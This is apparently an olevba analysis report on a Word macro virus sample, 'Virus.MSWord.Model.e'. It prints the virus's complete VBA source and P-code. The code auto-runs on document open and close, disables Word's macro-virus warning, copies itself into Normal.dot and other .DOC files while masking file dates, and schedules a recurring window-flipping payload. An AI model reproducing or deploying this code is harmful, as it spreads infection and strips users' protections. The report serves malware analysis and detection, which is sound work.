olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Model.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Model.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Code.bas 
in file: Virus.MSWord.Model.e - OLE stream: 'Macros/VBA/Code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoNew()
    CopyVirCode
End Sub
Sub AutoOpen()
    CopyVirCode
End Sub
Sub AutoExec()
    CopyVirCode
End Sub
Sub AutoClose()
    CopyVirCode
End Sub
Sub AutoExit()
    CopyVirCode
End Sub
Private Sub CopyVirCode()
    On Local Error Resume Next
    RemoveProtection
    If Not ActiveDocument = NormalTemplate Then 'Infetta Normal.dot
        CopyVirCodeToModel
    End If
    If Not ActiveDocument = ThisDocument Then   'Infetta il documento aperto
        CopyVirCodeToDocument ActiveDocument
    End If
End Sub
Private Sub CopyVirCodeToModel()
    On Local Error Resume Next
    oldDate = Date
    Date = FileDateTime(FileName)
    With ActiveDocument
        .UpdateStylesOnOpen = False
        .AttachedTemplate = "Normal.dot"
    End With
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Code", Object:=wdOrganizerObjectProjectItems
    NormalTemplate.Save
    Date = oldDate
End Sub
Private Sub CopyVirCodeToDocument(Target As Document)
    On Local Error Resume Next
    Set fs = Application.FileSearch
    With fs
     .LookIn = Target.Path
     .FileName = "*.DOC"
     If .Execute(SortBy:=msoSortByFileName, SortOrder:=msoSortOrderAscending) > 0 Then
      Randomize
      FileName = .FoundFiles(Int((.FoundFiles.Count * Rnd) + 1))
      oldDate = Date
      Date = FileDateTime(FileName)
      Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=FileName, Name:="Code", Object:=wdOrganizerObjectProjectItems
      Date = oldDate
     Else
       Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=Target.FullName, Name:="Code", Object:=wdOrganizerObjectProjectItems
     End If
    End With
    Application.OnTime When:=Now + TimeValue("04:00:00"), Name:="Normal.Code.Bomb"
End Sub
Private Sub RemoveProtection()
    'Disattiva il messaggio di avviso iniziale
    Options.VirusProtection = False
End Sub
Private Sub Bomb()
    On Local Error Resume Next
    For Each myTask In Tasks
     oldWindowState = ActiveWindow.WindowState
    
     myTask.WindowState = wdWindowStateMinimize
     myTask.WindowState = wdWindowStateMaximize
     myTask.WindowState = oldWindowState
    Next myTask
    Application.OnTime When:=Now + TimeValue("01:00:00"), Name:="Normal.Code.Bomb"
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Model.e
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Code - 4331 bytes
' Line #0:
' 	FuncDefn (Sub AutoNew())
' Line #1:
' 	ArgsCall CopyVirCode 0x0000 
' Line #2:
' 	EndSub 
' Line #3:
' 	FuncDefn (Sub AutoOpen())
' Line #4:
' 	ArgsCall CopyVirCode 0x0000 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Sub AutoExec())
' Line #7:
' 	ArgsCall CopyVirCode 0x0000 
' Line #8:
' 	EndSub 
' Line #9:
' 	FuncDefn (Sub AutoClose())
' Line #10:
' 	ArgsCall CopyVirCode 0x0000 
' Line #11:
' 	EndSub 
' Line #12:
' 	FuncDefn (Sub AutoExit())
' Line #13:
' 	ArgsCall CopyVirCode 0x0000 
' Line #14:
' 	EndSub 
' Line #15:
' 	FuncDefn (Private Sub CopyVirCode())
' Line #16:
' 	OnError <crash> 
' Line #17:
' 	ArgsCall RemoveProtection 0x0000 
' Line #18:
' 	Ld ActiveDocument 
' 	Ld NormalTemplate 
' 	Eq 
' 	Not 
' 	IfBlock 
' 	QuoteRem 0x0030 0x0012 "Infetta Normal.dot"
' Line #19:
' 	ArgsCall CopyVirCodeToModel 0x0000 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	Ld ActiveDocument 
' 	Ld ThisDocument 
' 	Eq 
' 	Not 
' 	IfBlock 
' 	QuoteRem 0x0030 0x001B "Infetta il documento aperto"
' Line #22:
' 	Ld ActiveDocument 
' 	ArgsCall CopyVirCodeToDocument 0x0001 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	EndSub 
' Line #25:
' 	FuncDefn (Private Sub CopyVirCodeToModel())
' Line #26:
' 	OnError <crash> 
' Line #27:
' 	Ld Date 
' 	St oldDate 
' Line #28:
' 	Ld FileName 
' 	ArgsLd FileDateTime 0x0001 
' 	St Date 
' Line #29:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #30:
' 	LitVarSpecial (False)
' 	MemStWith UpdateStylesOnOpen 
' Line #31:
' 	LitStr 0x000A "Normal.dot"
' 	MemStWith AttachedTemplate 
' Line #32:
' 	EndWith 
' Line #33:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0004 "Code"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #34:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #35:
' 	Ld oldDate 
' 	St Date 
' Line #36:
' 	EndSub 
' Line #37:
' 	FuncDefn (Private Sub CopyVirCodeToDocument(Target As ))
' Line #38:
' 	OnError <crash> 
' Line #39:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set fs 
' Line #40:
' 	StartWithExpr 
' 	Ld fs 
' 	With 
' Line #41:
' 	Ld Target 
' 	MemLd Path 
' 	MemStWith LookIn 
' Line #42:
' 	LitStr 0x0005 "*.DOC"
' 	MemStWith FileName 
' Line #43:
' 	Ld msoSortByFileName 
' 	ParamNamed SortBy 
' 	Ld msoSortOrderAscending 
' 	ParamNamed SortOrder 
' 	ArgsMemLdWith Execute 0x0002 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #44:
' 	ArgsCall Read 0x0000 
' Line #45:
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	St FileName 
' Line #46:
' 	Ld Date 
' 	St oldDate 
' Line #47:
' 	Ld FileName 
' 	ArgsLd FileDateTime 0x0001 
' 	St Date 
' Line #48:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld FileName 
' 	ParamNamed Destination 
' 	LitStr 0x0004 "Code"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #49:
' 	Ld oldDate 
' 	St Date 
' Line #50:
' 	ElseBlock 
' Line #51:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld Target 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0004 "Code"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	EndWith 
' Line #54:
' 	Ld Now 
' 	LitStr 0x0008 "04:00:00"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed When 
' 	LitStr 0x0010 "Normal.Code.Bomb"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #55:
' 	EndSub 
' Line #56:
' 	FuncDefn (Private Sub RemoveProtection())
' Line #57:
' 	QuoteRem 0x0004 0x0029 "Disattiva il messaggio di avviso iniziale"
' Line #58:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #59:
' 	EndSub 
' Line #60:
' 	FuncDefn (Private Sub Bomb())
' Line #61:
' 	OnError <crash> 
' Line #62:
' 	StartForVariable 
' 	Ld myTask 
' 	EndForVariable 
' 	Ld Tasks 
' 	ForEach 
' Line #63:
' 	Ld ActiveWindow 
' 	MemLd WindowState 
' 	St oldWindowState 
' Line #64:
' Line #65:
' 	Ld wdWindowStateMinimize 
' 	Ld myTask 
' 	MemSt WindowState 
' Line #66:
' 	Ld wdWindowStateMaximize 
' 	Ld myTask 
' 	MemSt WindowState 
' Line #67:
' 	Ld oldWindowState 
' 	Ld myTask 
' 	MemSt WindowState 
' Line #68:
' 	StartForVariable 
' 	Ld myTask 
' 	EndForVariable 
' 	NextVar 
' Line #69:
' 	Ld Now 
' 	LitStr 0x0008 "01:00:00"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed When 
' 	LitStr 0x0010 "Normal.Code.Bomb"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #70:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

